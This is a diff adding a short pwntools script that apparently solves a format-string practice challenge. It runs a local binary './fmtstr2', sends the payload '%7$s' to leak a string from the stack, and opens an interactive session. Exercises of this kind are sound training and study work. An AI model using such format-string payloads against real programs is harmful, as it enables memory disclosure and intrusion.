@@ -1,0 +1,14 @@
+from pwn import *
+
+p = process("./fmtstr2")
+'''
+p = gdb.debug("./fmtstr2", gdbscript = 
+b *main
+r
+)
+'''
+
+payload = b"%7$s"
+p.sendafter(b"something: ", payload)
+
+p.interactive()
